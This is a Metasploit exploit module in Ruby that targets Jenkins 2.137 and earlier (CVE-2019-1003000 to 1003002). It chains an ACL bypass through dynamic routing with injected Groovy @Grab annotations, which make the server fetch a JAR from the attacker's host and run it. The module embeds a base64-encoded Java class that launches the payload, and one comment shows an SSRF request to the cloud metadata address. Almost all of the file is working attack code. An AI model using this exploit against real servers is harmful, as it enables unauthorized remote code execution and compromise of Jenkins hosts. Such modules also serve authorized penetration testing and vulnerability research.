# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Jenkins ACL Bypass and Metaprogramming RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in Jenkins dynamic routing to
        bypass the Overall/Read ACL and leverage Groovy metaprogramming to
        download and execute a malicious JAR file.

        The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work
        on later versions of Jenkins.

        Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.
      },
      &#039;Author&#039;         => [
        &#039;Orange Tsai&#039;, # Discovery and PoC
        &#039;wvu&#039;          # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2019-1003000&#039;], # Script Security
        [&#039;CVE&#039;, &#039;2019-1003001&#039;], # Pipeline: Groovy
        [&#039;CVE&#039;, &#039;2019-1003002&#039;], # Pipeline: Declarative
        [&#039;EDB&#039;, &#039;46427&#039;],
        [&#039;URL&#039;, &#039;https://jenkins.io/security/advisory/2019-01-08/&#039;],
        [&#039;URL&#039;, &#039;https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html&#039;],
        [&#039;URL&#039;, &#039;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&#039;],
        [&#039;URL&#039;, &#039;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2019-01-08&#039;, # Public disclosure
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Jenkins <= 2.137 (Pipeline: Groovy Plugin <= 2.61)&#039;,
          &#039;Version&#039;    => Gem::Version.new(&#039;2.137&#039;)
        ]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Notes&#039;          => {
        &#039;Stability&#039;    => [CRASH_SAFE],
        &#039;SideEffects&#039;  => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
        &#039;Reliability&#039;  => [REPEATABLE_SESSION]
      },
      &#039;Stance&#039;         => Stance::Aggressive # Be aggressive, b-e aggressive!
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to Jenkins&#039;, &#039;/&#039;])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])

    deregister_options(&#039;URIPATH&#039;)
  end

=begin
  http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
=end
  def check
    checkcode = CheckCode::Safe

    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => go_go_gadget1(&#039;/search/index&#039;),
      &#039;vars_get&#039; => {&#039;q&#039; => &#039;a&#039;}
    )

    unless res && (version = res.headers[&#039;X-Jenkins&#039;])
      vprint_error(&#039;Jenkins not detected&#039;)
      return CheckCode::Unknown
    end

    vprint_status("Jenkins #{version} detected")
    checkcode = CheckCode::Detected

    if Gem::Version.new(version) > target[&#039;Version&#039;]
      vprint_error("Jenkins #{version} is not a supported target")
      return CheckCode::Safe
    end

    vprint_good("Jenkins #{version} is a supported target")
    checkcode = CheckCode::Appears

    if res.body.include?(&#039;Administrator&#039;)
      vprint_good(&#039;ACL bypass successful&#039;)
      checkcode = CheckCode::Vulnerable
    else
      vprint_error(&#039;ACL bypass unsuccessful&#039;)
      return CheckCode::Safe
    end

    checkcode
  end

  def exploit
    unless check == CheckCode::Vulnerable || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    # NOTE: Jenkins/Groovy/Ivy uses HTTP unconditionally, so we can&#039;t use HTTPS
    # HACK: Both HttpClient and HttpServer use datastore[&#039;SSL&#039;]
    ssl = datastore[&#039;SSL&#039;]
    datastore[&#039;SSL&#039;] = false
    start_service(&#039;Path&#039; => &#039;/&#039;)
    datastore[&#039;SSL&#039;] = ssl

    print_status(&#039;Sending Jenkins and Groovy go-go-gadgets&#039;)
    send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => go_go_gadget1,
      &#039;vars_get&#039; => {&#039;value&#039; => go_go_gadget2}
    )
  end

  #
  # Exploit methods
  #

=begin
  http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
  ?apiUrl=http://169.254.169.254/%23
  &login=orange
  &password=tsai
=end
  def go_go_gadget1(custom_uri = nil)
    # NOTE: See CVE-2018-1000408 for why we don&#039;t want to randomize the username
    acl_bypass = normalize_uri(target_uri.path, &#039;/securityRealm/user/admin&#039;)

    return normalize_uri(acl_bypass, custom_uri) if custom_uri

    normalize_uri(
      acl_bypass,
      &#039;/descriptorByName&#039;,
      &#039;/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile&#039;
    )
  end

=begin
  http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
  ?value=
  @GrabConfig(disableChecksums=true)%0a
  @GrabResolver(name=&#039;orange.tw&#039;, root=&#039;http://[your_host]/&#039;)%0a
  @Grab(group=&#039;tw.orange&#039;, module=&#039;poc&#039;, version=&#039;1&#039;)%0a
  import Orange;
=end
  def go_go_gadget2
    (
      <<~EOF
        @GrabConfig(disableChecksums=true)
        @GrabResolver(&#039;http://#{srvhost_addr}:#{srvport}/&#039;)
        @Grab(&#039;#{vendor}:#{app}:#{version}&#039;)
        import #{app}
      EOF
    ).strip
  end

  #
  # Payload methods
  #

  #
  # If you deviate from the following sequence, you will suffer!
  #
  # HEAD /path/to/pom.xml     -> 404
  # HEAD /path/to/payload.jar -> 200
  # GET  /path/to/payload.jar -> 200
  #
  def on_request_uri(cli, request)
    vprint_status("#{request.method} #{request.uri} requested")

    unless %w[HEAD GET].include?(request.method)
      vprint_error("Ignoring #{request.method} request")
      return
    end

    if request.method == &#039;HEAD&#039;
      if request.uri != payload_uri
        vprint_error(&#039;Sending 404&#039;)
        return send_not_found(cli)
      end

      vprint_good(&#039;Sending 200&#039;)
      return send_response(cli, &#039;&#039;)
    end

    if request.uri != payload_uri
      vprint_error(&#039;Sending bogus file&#039;)
      return send_response(cli, "#{Faker::Hacker.say_something_smart}\n")
    end

    vprint_good(&#039;Sending payload JAR&#039;)
    send_response(
      cli,
      payload_jar,
      &#039;Content-Type&#039; => &#039;application/java-archive&#039;
    )

    # XXX: $HOME may not work in some cases
    register_dir_for_cleanup("$HOME/.groovy/grapes/#{vendor}")
  end

  def payload_jar
    jar = payload.encoded_jar

    jar.add_file("#{app}.class", exploit_class)
    jar.add_file(
      &#039;META-INF/services/org.codehaus.groovy.plugins.Runners&#039;,
      "#{app}\n"
    )

    jar.pack
  end

=begin javac Exploit.java
  import metasploit.Payload;

  public class Exploit {
      public Exploit(){
          try {
              Payload.main(null);
          } catch (Exception e) { }

      }
  }
=end
  def exploit_class
    klass = Rex::Text.decode_base64(
      <<~EOF
        yv66vgAAADMAFQoABQAMCgANAA4HAA8HABAHABEBAAY8aW5pdD4BAAMoKVYB
        AARDb2RlAQANU3RhY2tNYXBUYWJsZQcAEAcADwwABgAHBwASDAATABQBABNq
        YXZhL2xhbmcvRXhjZXB0aW9uAQAHRXhwbG9pdAEAEGphdmEvbGFuZy9PYmpl
        Y3QBABJtZXRhc3Bsb2l0L1BheWxvYWQBAARtYWluAQAWKFtMamF2YS9sYW5n
        L1N0cmluZzspVgAhAAQABQAAAAAAAQABAAYABwABAAgAAAA3AAEAAgAAAA0q
        twABAbgAAqcABEyxAAEABAAIAAsAAwABAAkAAAAQAAL/AAsAAQcACgABBwAL
        AAAA
      EOF
    )

    klass.sub(/.Exploit/, "#{[app.length].pack(&#039;C&#039;)}#{app}")
  end

  #
  # Utility methods
  #

  def payload_uri
    "/#{vendor}/#{app}/#{version}/#{app}-#{version}.jar"
  end

  def vendor
    @vendor ||= Faker::App.author.split(/[^[:alpha:]]/).join
  end

  def app
    @app ||= Faker::App.name.split(/[^[:alpha:]]/).join
  end

  def version
    @version ||= Faker::App.semantic_version
  end

end

